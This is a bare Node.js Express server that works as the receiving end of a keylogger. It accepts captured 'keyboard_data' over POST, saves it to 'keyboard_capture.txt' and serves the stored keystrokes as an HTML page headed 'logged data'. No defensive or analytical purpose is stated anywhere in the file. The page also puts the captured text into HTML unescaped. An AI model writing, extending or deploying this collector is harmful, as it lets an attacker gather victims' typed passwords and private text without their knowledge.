const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

const app = express();
const port = 8080;

app.use(bodyParser.json({ extended: true }));

app.get("/", (req, res) => {
  try {
    const keylogFile = fs.readFileSync("keyboard_capture.txt", {
      encoding: "utf-8",
      flag: "r",
    });
    res.send(`<h1>logged data</h1><p>${keylogFile.replace("\n", "<br>")}</p>`);
  } catch {
    res.send("<h1>nothing logged yet</h1>");
  }
});

app.post("/", (req, res) => {
  console.log(req.body.keyboard_data);
  fs.writeFileSync("keyboard_capture.txt", req.body.keyboard_data);
  res.send("successfully set data");
});

app.listen(port, () => {
  console.log(`app is listening on port ${port}`);
});
